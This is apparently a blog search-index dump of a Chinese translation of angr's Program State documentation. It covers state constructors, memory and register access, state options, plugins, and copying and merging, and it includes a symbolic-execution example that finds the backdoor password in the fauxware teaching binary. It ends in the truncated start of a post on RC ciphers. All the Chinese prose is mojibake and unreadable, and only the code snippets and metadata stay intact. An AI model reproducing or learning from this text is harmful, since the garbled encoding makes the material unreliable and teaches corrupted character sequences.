\u003e\u003e\u003e state = proj.factory.entry_state(stdin=angr.SimFile) # ç›®å‰è¯·å¿½ç•¥è¿™ä¸ªé…ç½®ï¼Œä¸ºäº†æ•™å­¦ï¼Œæˆ‘ä»¬ç¦ç”¨äº†æ›´å¤æ‚çš„é»˜è®¤é…ç½® \u003e\u003e\u003e while True: ... succ = state.step() ... if len(succ.successors) == 2: ... break ... state = succ.successors[0] \u003e\u003e\u003e state1, state2 = succ.successors \u003e\u003e\u003e state1 \u003cSimState @ 0x400629\u003e \u003e\u003e\u003e state2 \u003cSimState @ 0x400699 ä¸è¦ç›´æ¥å»çœ‹è¿™äº›çŠ¶æ€çš„çº¦æŸâ€”â€”æˆ‘ä»¬åˆšç»è¿‡çš„åˆ†æ”¯æ¶‰åŠåˆ°strcmpçš„ç»“æœï¼Œè¿™æ˜¯ä¸€ä¸ªéš¾ä»¥ç”¨ç¬¦å·æ–¹å¼æ¨¡æ‹Ÿçš„å‡½æ•°ï¼Œç”±æ­¤äº§ç”Ÿçš„çº¦æŸéå¸¸å¤æ‚ã€‚ æˆ‘ä»¬æ¨¡æ‹Ÿçš„ç¨‹åºä»æ ‡å‡†è¾“å…¥è·å–æ•°æ®ï¼Œé»˜è®¤æƒ…å†µä¸‹å°†å…¶è§†ä¸ºæ— é™çš„ç¬¦å·æ•°æ®æµã€‚ä¸ºäº†è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œæˆ‘ä»¬éœ€è¦stdinå®é™…å†…å®¹çš„å¼•ç”¨ï¼Œæˆ‘ä»¬ç¨åå°†ä¼šè®¨è®ºæˆ‘ä»¬çš„æ–‡ä»¶å’Œè¾“å…¥å­ç³»ç»Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä½†ç°åœ¨ï¼Œåªéœ€ä½¿ç”¨state.posix.stdin.load(0, state.posix.stdin.size)å–å¾—åˆ°ç›®å‰ä¸ºæ­¢ä»æ ‡å‡†è¾“å…¥è¯»å–çš„æ‰€æœ‰å†…å®¹æ„æˆçš„bitvectorã€‚ \u003e\u003e\u003e input_data = state1.posix.stdin.load(0, state1.posix.stdin.size) \u003e\u003e\u003e state1.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00\\x00\\x00' \u003e\u003e\u003e state2.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x00\\x80N\\x00\\x00 \\x00\\x00\\x00\\x00' æ­£å¦‚ä½ æ‰€è§ï¼Œä¸ºäº†è¿›å…¥state1è·¯å¾„ï¼Œä½ å¿…é¡»å°†åé—¨å­—ç¬¦ä¸²â€œSOSNEAKYâ€ä½œä¸ºå¯†ç ï¼Œä¸ºäº†è¿›å…¥state2è·¯å¾„ï¼Œä½ å¿…é¡»è¾“å…¥åé—¨å­—ç¬¦ä¸²ä»¥å¤–çš„å†…å®¹ã€‚z3æ‰“å°äº†æ•°åäº¿ä¸ªç¬¦åˆçš„å­—ç¬¦ä¸²ä¹‹ä¸€ã€‚ Fauxwareæ˜¯ç¬¬ä¸€ä¸ªangræˆåŠŸè¿›è¡Œç¬¦å·æ‰§è¡Œçš„ç¨‹åºï¼Œæ—¶é—´åœ¨2013å¹´ã€‚é€šè¿‡ä½¿ç”¨angræ‰¾åˆ°å®ƒçš„åé—¨ï¼Œä½ æ­£åœ¨å‚ä¸ä¸€ä¸ªä¼Ÿå¤§çš„ä¼ ç»Ÿï¼Œä½ å·²ç»å¯¹å¦‚ä½•é€šè¿‡ç¬¦å·æ‰§è¡Œä»äºŒè¿›åˆ¶ç¨‹åºä¸­è·å–æœ‰æ„ä¹‰ä¿¡æ¯æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼ ","date":"2022-09-14","objectID":"/2022/09/program_state/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"é¢„è®¾çŠ¶æ€ï¼ˆState Presetsï¼‰ åœ¨æ­¤ä¹‹å‰ï¼Œå½“æˆ‘ä»¬æ“ä½œstateæ—¶ï¼Œéƒ½ä¼šä½¿ç”¨project.factory.entry_state()æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„çŠ¶æ€ï¼Œè¿™åªæ˜¯angrå¯ä½¿ç”¨çš„å‡ ä¸ªæ„é€ å‡½æ•°ä¹‹ä¸€ï¼š .blank_state()æ„é€ ä¸€ä¸ªç©ºç™½çŠ¶æ€ï¼Œå®ƒçš„å¤§éƒ¨åˆ†æ•°æ®éƒ½æœªåˆå§‹åŒ–ï¼Œè®¿é—®æœªåˆå§‹åŒ–çš„æ•°æ®æ—¶ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªä¸å¸¦çº¦æŸçš„ç¬¦å·å€¼ .entry_state()æ„é€ ä¸€ä¸ªåœ¨mainå‡½æ•°å…¥å£ç‚¹çš„çŠ¶æ€ .full_init_state()æ„é€ ä¸€ä¸ªå‡†å¤‡å¥½åœ¨mainå‡½æ•°å…¥å£ç‚¹ä¹‹å‰è¿è¡Œçš„åˆå§‹åŒ–ç¨‹åºæ‰§è¡Œã€‚ä¾‹å¦‚ï¼šå…±äº«åº“æ„é€ å‡½æ•°æˆ–é¢„è®¾åˆå§‹åŒ–å™¨ï¼Œå®Œæˆè¿™äº›åï¼Œå®ƒå°†è·³è½¬åˆ°ç¨‹åºå…¥å£ç‚¹ .call_state()æ„é€ ä¸€ä¸ªå‡†å¤‡å¥½æ‰§è¡Œç»™å®šå‡½æ•°çš„çŠ¶æ€ ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ„é€ å‡½æ•°å‚æ•°è‡ªå®šä¹‰çŠ¶æ€ ä¸Šè¿°æ‰€æœ‰æ„é€ å‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨addrå‚æ•°æŒ‡å®šå¼€å§‹æ‰§è¡Œçš„ç¡®åˆ‡åœ°å€ å¦‚æœä½ åœ¨ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦å‘½ä»¤è¡Œå‚æ•°æˆ–ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä½¿ç”¨argsåˆ—è¡¨æˆ–envå­—å…¸ä¼ é€’å‚æ•°ï¼Œåªæœ‰entry_stateå’Œfull_init_stateå¯ä½¿ç”¨ã€‚è¿™äº›å‚æ•°ä¸­çš„å€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–bitvectorï¼Œéƒ½ä¼šè¢«åºåˆ—åŒ–ä¸ºstateä¸­çš„argså’Œenvã€‚é»˜è®¤çš„argsæ˜¯ä¸ªç©ºåˆ—è¡¨ï¼Œæ‰€ä»¥å“ªæ€•ä½ çš„ç¨‹åºåªéœ€è¦argv[0]ï¼Œä½ éƒ½éœ€è¦è‡ªå·±æä¾› å¦‚æœä½ éœ€è¦ä½¿ç”¨ç¬¦å·åŒ–çš„argcï¼Œä½ å¯ä»¥å°†ä¸€ä¸ªbitvectorä¼ é€’ç»™argcå‚æ•°ï¼Œåªæœ‰entry_stateå’Œfull_init_stateå¯ä½¿ç”¨ã€‚ä½†æ˜¯è¦å°å¿ƒï¼Œå¦‚æœä½ è¿™æ ·åšï¼Œä½ è¦æ·»åŠ ä¸€ä¸ªçº¦æŸï¼šargcçš„å€¼ä¸èƒ½å¤§äºargsçš„æ•°é‡ è¦ä½¿ç”¨call stateï¼Œä½ åº”è¯¥ä½¿ç”¨.call_state(addr, arg1, arg2, â€¦â€¦)ï¼Œaddræ˜¯ä½ è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ï¼ŒargNæ˜¯è¯¥å‡½æ•°çš„ç¬¬nä¸ªå‚æ•°ï¼Œæ— è®ºæ˜¯python æ•´æ•°ã€å­—ç¬¦ä¸²ã€åˆ—è¡¨è¿˜æ˜¯bitvectoréƒ½å¯ä»¥ã€‚å¦‚æœä½ æƒ³å¾—åˆ°å†…å­˜ä¸­æŒ‡å‘ä¸€ä¸ªå¯¹è±¡çš„å®é™…çš„æŒ‡é’ˆï¼Œä½ åº”è¯¥å°†å…¶åŒ…è£…åœ¨PointerWrapperä¸­ï¼Œå³angr.PointerWrapper(\"point to me!\")ï¼Œè¿™ä¸ªAPIç»“æœå¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬æ­£åœ¨åŠªåŠ›æ”¹å–„ ä½¿ç”¨call_stateæ—¶è‹¥è¦æŒ‡å®šå‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œå¯ä»¥ä½¿ç”¨ccå‚æ•°ä¼ é€’ä¸€ä¸ªSimCCå®ä¾‹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹angrä¼šé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ–¹å¼ä½œä¸ºé»˜è®¤å€¼ï¼Œä½†åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œéœ€è¦ä½ æ‰‹åŠ¨æŒ‡å®š åœ¨è¿™äº›æ„é€ å‡½æ•°ä¸­è¿˜æœ‰æ›´å¤šçš„é€‰é¡¹å¯ä»¥ä½¿ç”¨ï¼Œæ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…docs on the project.factory object (an AngrObjectFactory) ","date":"2022-09-14","objectID":"/2022/09/program_state/:3:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"å†…å­˜åº•å±‚æ¥å£ï¼ˆLow level interface for memoryï¼‰ state.memæ¥å£ä¾¿äºä»å†…å­˜ä¸­åŠ è½½ç‰¹å®šç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å½“ä½ æƒ³è¦å¯¹ä¸€æ®µå†…å­˜è¿›è¡ŒåŸæ ·çš„åŠ è½½å’Œå­˜å‚¨æ—¶ï¼Œå®ƒå°±æ˜¾çš„ååˆ†ç¹çã€‚äº‹å®ä¸Šï¼Œstate.memçš„åº•å±‚ä½¿ç”¨äº†state.memoryï¼Œstate.memoryè¡¨ç¤ºä¸€ä¸ªå¡«å……äº†bitvectorçš„å¹³å¦åœ°å€ç©ºé—´ã€‚ä½ å¯ä»¥ä½¿ç”¨state.memory.load(addr, size)å’Œstate.memory.store(addr, val)ç›´æ¥æ“ä½œå†…å­˜ï¼š \u003e\u003e\u003e s = proj.factory.blank_state() \u003e\u003e\u003e s.memory.store(0x4000, s.solver.BVV(0x0123456789abcdef0123456789abcdef, 128)) \u003e\u003e\u003e s.memory.load(0x4004, 6) # åŠ è½½å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ \u003cBV48 0x89abcdef0123\u003e æ­£å¦‚ä½ æ‰€è§ï¼Œæ•°æ®ä»¥å¤§ç«¯åºè¿›è¡ŒåŠ è½½å’Œå­˜å‚¨ï¼Œå› ä¸ºstate.memoryçš„ä¸»è¦ç›®çš„æ˜¯åŠ è½½æ²¡æœ‰é™„åŠ è¯­ä¹‰çš„å­˜å‚¨æ•°æ®ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³æŠŠå®ƒä»¬è½¬åŒ–ä¸ºå°ç«¯åºï¼Œä½ å¯ä»¥è®¾ç½®endnessä¸ºlittle-endianã€‚endnessçš„å–å€¼åº”è¯¥æ˜¯archinfoåŒ…ä¸­Endnessæšä¸¾é‡ä¹‹ä¸€ã€‚æ­¤å¤–ï¼Œæ­£åœ¨åˆ†æç¨‹åºçš„å­—èŠ‚åºå¯ä»¥ä»arch.memory_endnesså¾—åˆ°ï¼Œä¾‹å¦‚state.arch.memory_endness \u003e\u003e\u003e import archinfo \u003e\u003e\u003e s.memory.load(0x4000, 4, endness=archinfo.Endness.LE) \u003cBV32 0x67452301\u003e è¿˜æœ‰ä¸€ä¸ªç”¨äºå¯„å­˜å™¨è®¿é—®çš„åº•å±‚æ¥å£state.registersï¼Œä½¿ç”¨æ–¹æ³•ä¸state.memoryå®Œå…¨ç›¸åŒï¼Œä½†è§£é‡Šå®ƒçš„è¡Œä¸ºéœ€è¦æ·±å…¥äº†è§£angrç”¨äºæ— ç¼å¤„ç†å¤šæ¶æ„çš„æŠ½è±¡ã€‚ç®€å•æ¥è¯´å®ƒæ˜¯ä¸€ä¸ªå¯„å­˜å™¨æ–‡ä»¶ï¼Œå¯„å­˜å™¨å’Œåç§»é‡çš„æ˜ å°„åœ¨archinfoä¸­å®šä¹‰ ","date":"2022-09-14","objectID":"/2022/09/program_state/:4:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"çŠ¶æ€é€‰é¡¹ï¼ˆState Optionsï¼‰ ä½ å¯ä»¥ä½¿ç”¨ä¸€äº›çŠ¶æ€é€‰é¡¹å¯¹angrçš„å†…éƒ¨è¿›è¡Œå¾ˆå¤šå°è°ƒæ•´ï¼Œè¿™äº›è°ƒæ•´åœ¨æŸäº›æƒ…å†µä¸‹ä¼šä¼˜åŒ–angrçš„è¡Œä¸ºï¼Œè€Œåœ¨å…¶ä»–æƒ…å†µä¸‹ä¼šæœ‰æ‰€æŸå®³ã€‚ åœ¨æ¯ä¸ªSimStateå¯¹è±¡ä¸Šï¼Œéƒ½æœ‰ä¸€ç»„å¯ç”¨çš„é€‰é¡¹ï¼ˆstate.optionsï¼‰ã€‚æ¯ä¸ªé€‰é¡¹ï¼ˆå®é™…ä¸Šåªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰éƒ½ä»¥æŸç§å¾®å°çš„æ–¹å¼æ§åˆ¶angræ‰§è¡Œå¼•æ“çš„è¡Œä¸ºã€‚å¯ä»¥åœ¨é™„å½•ä¸­æ‰¾åˆ°å®Œæ•´çš„é€‰é¡¹åˆ—è¡¨åŠå…¶é»˜è®¤å€¼ã€‚ä½ å¯ä»¥ä½¿ç”¨angr.optionsè®¿é—®å¹¶å‘stateæ·»åŠ æŸä¸ªé€‰é¡¹ã€‚å•ä¸ªé€‰é¡¹ä¸€èˆ¬ä»¥å¤§å†™å­—æ¯å‘½åï¼Œä½†ä¹Ÿæœ‰ä¸€äº›ä½ å¯èƒ½å¸Œæœ›æ†ç»‘åœ¨ä¸€èµ·ä½¿ç”¨çš„å¸¸ç”¨å¯¹è±¡åˆ†ç»„ï¼Œä»¥å°å†™å­—æ¯å‘½åã€‚ æ— è®ºç”¨ä»»ä½•æ„é€ å‡½æ•°åˆ›å»ºSimStateæ—¶ï¼Œä½ éƒ½å¯ä»¥ä½¿ç”¨å‚æ•°add_optionså’Œremove_optionsä¼ é€’ä»é»˜è®¤å€¼ä¿®æ”¹çš„é€‰é¡¹ã€‚ # ä¾‹å¦‚: å¯ç”¨lazy_solves, è¿™ä¸ªé€‰é¡¹ä¼šå°½å¯èƒ½å‡å°‘æ£€æŸ¥çŠ¶æ€æ˜¯å¦æ»¡è¶³çº¦æŸ # å¯¹æ­¤è®¾ç½®çš„æ›´æ”¹ä¼šå½±å“æ­¤è¡Œä¹‹åæ‰€æœ‰ç”±æ­¤çŠ¶æ€åˆ›å»ºçš„åç»§çŠ¶æ€ \u003e\u003e\u003e s.options.add(angr.options.LAZY_SOLVES) # åˆ›å»ºä¸€ä¸ªstateå¹¶ä¸”å¼€å¯lazy_solves \u003e\u003e\u003e s = proj.factory.entry_state(add_options={angr.options.LAZY_SOLVES}) # åˆ›å»ºä¸€ä¸ªä¸å¯ç”¨simplificationé€‰é¡¹çš„æ–°çŠ¶æ€ \u003e\u003e\u003e s = proj.factory.entry_state(remove_options=angr.options.simplification) ","date":"2022-09-14","objectID":"/2022/09/program_state/:5:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"çŠ¶æ€æ’ä»¶ï¼ˆState Pluginsï¼‰ é™¤äº†åˆšåˆšè®¨è®ºçš„å„ç§é€‰é¡¹ä¹‹å¤–ï¼Œå­˜å‚¨åœ¨SimStateä¸­çš„æ‰€æœ‰å†…å®¹å®é™…ä¸Šéƒ½å­˜å‚¨åœ¨é™„åŠ åˆ°stateçš„å„ç§æ’ä»¶ä¸­ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬è®¨è®ºçš„å‡ ä¹æ¯ä¸ªstateå±æ€§ï¼ˆmemoryã€registersã€memã€regsã€solverç­‰ç­‰ï¼‰éƒ½æ˜¯å¯æ’æ‹”çš„ã€‚è¿™ç§è®¾è®¡å…è®¸ä»£ç æ¨¡å—åŒ–ï¼Œä»¥åŠæ¨¡æ‹ŸçŠ¶æ€çš„å…¶ä»–æ–¹é¢è½»æ¾å®ç°æ–°å‹æ•°æ®å­˜å‚¨ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–æ’ä»¶æ›¿ä»£å®ç°ã€‚ ä¾‹å¦‚ï¼Œæ™®é€šçš„memoryæ’ä»¶æ¨¡æ‹Ÿäº†ä¸€ä¸ªå¹³å¦çš„å†…å­˜ç©ºé—´ï¼Œä½†æ˜¯åˆ†ææ—¶å¯ä»¥é€‰æ‹©â€œabstract memoryâ€æ’ä»¶ï¼Œå®ƒä½¿ç”¨åœ°å€çš„æ›¿ä»£æ•°æ®ç±»å‹æ¥æ¨¡æ‹Ÿç‹¬ç«‹äºåœ°å€çš„è‡ªç”±æµ®åŠ¨å†…å­˜æ˜ å°„ï¼Œæ¥æä¾›state.memoryã€‚å¦ä¸€æ–¹é¢ï¼Œæ’ä»¶å¯ä»¥é™ä½ä»£ç å¤æ‚åº¦ï¼šstate.memoryå’Œstate.registerså®é™…ä¸Šæ˜¯åŒä¸€ä¸ªæ’ä»¶çš„ä¸¤ä¸ªä¸åŒå®ä¾‹ï¼Œå› ä¸ºå¯„å­˜å™¨ä¹Ÿæ˜¯ç”¨åœ°å€ç©ºé—´æ¨¡æ‹Ÿçš„ã€‚ ","date":"2022-09-14","objectID":"/2022/09/program_state/:6:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"å…¨å±€æ’ä»¶ï¼ˆThe global pluginï¼‰ state.globalsæ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ’ä»¶ï¼šå®ƒå®ç°äº†python dictç›¸å…³çš„æ¥å£ï¼Œå…è®¸ä½ åœ¨stateä¸Šå­˜å‚¨ä»»æ„æ•°æ®ã€‚ ","date":"2022-09-14","objectID":"/2022/09/program_state/:7:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"å†å²æ’ä»¶ï¼ˆThe history pluginï¼‰ state.historyæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ’ä»¶ï¼Œç”¨äºå­˜å‚¨ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€é‡‡ç”¨è·¯å¾„çš„å†å²æ•°æ®ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€äº›å†å²èŠ‚ç‚¹çš„é“¾è¡¨ï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€è½®æ‰§è¡Œï¼Œä½ å¯ä»¥ç”¨state.history.parent.parentâ€¦â€¦æ¥éå†è¿™ä¸ªåˆ—è¡¨ ä¸ºäº†è®©ä½ æ›´æ–¹ä¾¿åœ°è®¿é—®å†å²æ•°æ®ï¼Œå®ƒè¿˜æä¾›äº†é’ˆå¯¹æŸäº›å€¼å¥½ç”¨çš„è¿­ä»£å™¨ã€‚é€šå¸¸ï¼Œè¿™äº›å€¼å­˜å‚¨åœ¨history.recent_NAMEï¼Œå®ƒä»¬çš„è¿­ä»£å™¨å¯ä»¥é€šè¿‡history.NAMEè®¿é—®ã€‚ä¾‹å¦‚ï¼Œfor addr in state.history.bbl_addrs: print hex(addr)ä¼šæ‰“å°å‡ºç»è¿‡çš„äºŒè¿›åˆ¶åŸºæœ¬å—çš„åœ°å€ï¼Œè€Œstate,history.recent_bbl_addrsæ˜¯æœ€è¿‘ä¸€æ­¥æ‰§è¡Œçš„åŸºæœ¬å—çš„åˆ—è¡¨ï¼Œstate.history.parent.recent_bbl_addrsæ˜¯ä¸Šä¸€æ­¥æ‰§è¡Œçš„åŸºæœ¬å—åˆ—è¡¨ã€‚å¦‚æœä½ éœ€è¦å¿«é€Ÿè®¿é—®è¿™äº›å€¼çš„å¹³å¦ï¼ˆflatï¼‰åˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨.hardcopyï¼Œä¾‹å¦‚state.history.bbl_addrs.hardcopyã€‚ä½†è¯·è®°ä½ï¼ŒåŸºäºç´¢å¼•çš„è®¿é—®æ˜¯åœ¨è¿­ä»£å™¨ä¸Šå®ç°çš„ ä»¥ä¸‹æ˜¯å­˜å‚¨åœ¨å†å²è®°å½•ä¸­çš„ä¸€äº›å€¼çš„ç®€è¦è¯´æ˜ï¼š history.descriptionsæ˜¯å¯¹æ¯ä¸€è½®æ‰§è¡Œçš„å­—ç¬¦ä¸²æè¿°åˆ—è¡¨ history.bbl_addrsæ˜¯æ‰§è¡Œçš„åŸºæœ¬å—åœ°å€çš„åˆ—è¡¨ã€‚æ¯è½®æ‰§è¡Œå¯èƒ½ä¸æ­¢ä¸€ä¸ªï¼Œå¹¶ä¸”å¹¶éæ‰€æœ‰åœ°å€éƒ½å¯¹åº”äºäºŒè¿›åˆ¶ä»£ç ï¼Œæœ‰äº›å¯èƒ½æ˜¯hookçš„SimProceduresçš„åœ°å€ history.jumpkindsæ˜¯å†å²ä¸­æ¯ä¸ªæ§åˆ¶æµå¤„ç†çš„åˆ—è¡¨ï¼Œä»¥VEXæšä¸¾å­—ç¬¦ä¸²å½¢å¼å±•ç° history.jump_guardsæ˜¯å†å²ä¸­é‡åˆ°çš„æ¯ä¸ªåˆ†æ”¯çš„æ¡ä»¶åˆ—è¡¨ history.eventsæ˜¯æ‰§è¡ŒæœŸé—´å‘ç”Ÿçš„â€œæœ‰è¶£äº‹ä»¶â€çš„åˆ—è¡¨ï¼Œä¾‹å¦‚ç¬¦å·è·³è½¬æ¡ä»¶çš„å­˜åœ¨ã€ç¨‹åºå¼¹å‡ºæ¶ˆæ¯æ¡†ã€é€€å‡ºä»£ç ç»ˆæ­¢ç¨‹åºæ‰§è¡Œ history.actionsé€šå¸¸ä¸ºç©ºï¼Œä½†å¦‚æœä½ åœ¨stateä¸­æ·»åŠ state.options.refsï¼Œå®ƒå°†è®°å½•ç¨‹åºæ‰§è¡Œæ—¶å†…å­˜ã€å¯„å­˜å™¨å’Œä¸´æ—¶å€¼è¢«è®¿é—®çš„æ—¥å¿— ","date":"2022-09-14","objectID":"/2022/09/program_state/:8:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"è°ƒç”¨æ ˆæ’ä»¶ï¼ˆThe callstack pluginï¼‰ angrä¼šè·Ÿè¸ªæ¨¡æ‹Ÿç¨‹åºçš„è°ƒç”¨æ ˆè¿‡ç¨‹ã€‚åœ¨æ¯æ¡è°ƒç”¨æŒ‡ä»¤è§¦å‘æ—¶ï¼Œéƒ½ä¼šåœ¨è°ƒç”¨æ ˆçš„è®°å½•é¡¶éƒ¨æ·»åŠ ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œè€Œæ¯å½“æ ˆæŒ‡é’ˆä¸‹é™åˆ°æœ€é¡¶å±‚å¸§ä»¥ä¸‹æ—¶ï¼Œå°±ä¼šå¼¹å‡ºä¸€ä¸ªå¸§ã€‚è¿™ä½¿angrèƒ½ç¨³å®šåœ°å­˜å‚¨å½“å‰æ¨¡æ‹Ÿå‡½æ•°çš„æ•°æ®ã€‚ å’Œå†å²è®°å½•ç±»ä¼¼ï¼Œè°ƒç”¨æ ˆè®°å½•ä¹Ÿæ˜¯ç”±èŠ‚ç‚¹æ„æˆçš„é“¾è¡¨ï¼Œä½†angrå¹¶æ²¡æœ‰æä¾›å¯¹èŠ‚ç‚¹å†…å®¹çš„è¿­ä»£å™¨ï¼Œå–è€Œä»£ä¹‹çš„ï¼Œä½ å¯ä»¥ç›´æ¥éå†state.callstackæ¥è·å–æ¯ä¸ªæ´»åŠ¨å¸§çš„è°ƒç”¨æ ˆå¸§ï¼ŒæŒ‰ä»æœ€æ–°åˆ°æœ€æ—§æ’åºï¼Œå¦‚æœä½ æƒ³è·å–é¡¶å±‚å¸§ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨state.callstack callstack.func_addræ˜¯å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°åœ°å€ callstack.call_site_addræ˜¯è°ƒç”¨å½“å‰å‡½æ•°çš„åŸºæœ¬å—çš„åœ°å€ callsack.stack_ptræ˜¯ä»å½“å‰å‡½æ•°å¼€å§‹çš„æ ˆæŒ‡é’ˆçš„å€¼ callstack.ret_addræ˜¯å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ ","date":"2022-09-14","objectID":"/2022/09/program_state/:9:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"æ›´å¤šå…³äºI/Oçš„ä¿¡æ¯ï¼šæ–‡ä»¶ã€æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œå¥—æ¥å­—ï¼ˆMore about I/O: Files, file systems, and network socketsï¼‰ è¯·å‚é˜…Working with File System, Sockets, and Pipesè·å–è¯¦ç»†çš„æ–‡æ¡£ ","date":"2022-09-14","objectID":"/2022/09/program_state/:10:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"å¤åˆ¶å’Œåˆå¹¶ï¼ˆCopying and Mergingï¼‰ stateæ”¯æŒå¿«é€Ÿå¤åˆ¶ï¼Œä»¥ä¾¿ä½ æ¢ç´¢ä¸åŒçš„åˆ†æ”¯ \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e s = proj.factory.blank_state() \u003e\u003e\u003e s1 = s.copy() \u003e\u003e\u003e s2 = s.copy() \u003e\u003e\u003e s1.mem[0x1000].uint32_t = 0x41414141 \u003e\u003e\u003e s2.mem[0x1000].uint32_t = 0x42424242 stateä¹Ÿå¯ä»¥åˆå¹¶åœ¨ä¸€èµ· # åˆå¹¶ä¼šè¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯åˆå¹¶çŠ¶æ€ # ç¬¬äºŒä¸ªå…ƒç´ æ˜¯æè¿°çŠ¶æ€æ ‡å¿—çš„ç¬¦å·å˜é‡ # ç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œæè¿°æ˜¯å¦è¿›è¡Œè¿‡åˆå¹¶ \u003e\u003e\u003e (s_merged, m, anything_merged) = s1.merge(s2) # ç°åœ¨è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è§£æä¸ºâ€œAAAAâ€æˆ–â€œBBBBâ€çš„è¡¨è¾¾å¼ \u003e\u003e\u003e aaaa_or_bbbb = s_merged.mem[0x1000].uint32_t TODOï¼šæè¿°åˆå¹¶çš„é™åˆ¶ ","date":"2022-09-14","objectID":"/2022/09/program_state/:11:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäº”ï¼‰Program State","uri":"/2022/09/program_state/"},{"categories":["Crypto"],"content":"RC algorithms RC algorithms æ˜¯ç”±Ron Rivestè®¾è®¡çš„ä¸€ç³»åˆ—åŠ å¯†ç®—æ³•ï¼Œåœ¨é€†å‘ä¸­å¸¸è§åˆ°çš„RC4å±äºå…¶ä¸­çš„ä¸€ä¸ªï¼Œä¸‹é¢å¼•è‡ªç»´åŸºç™¾ç§‘ RC1 was never published. RC2Â was a 64-bitÂ block cipherÂ developed in 1987. RC3 was broken before ever being used. RC4Â is aÂ stream cipher. RC5Â is a 32/64/128-bit block cipher developed in 1994. RC6, a 128-bit block cipher based heavily on RC5, was anÂ AES finalistÂ developed in 1997. ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:0:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"RC4 ","date":"2022-09-13","objectID":"/2022/09/rc_algorithms/:1:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸‰ï¼‰RC algorithms","uri":"/2022/09/rc_algorithms/"},{"categories":["Crypto"],"content":"ç®—æ³•ç®€ä»‹ RC4æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ã€‚æ‰€è°“æµåŠ å¯†ï¼Œå…¶æ 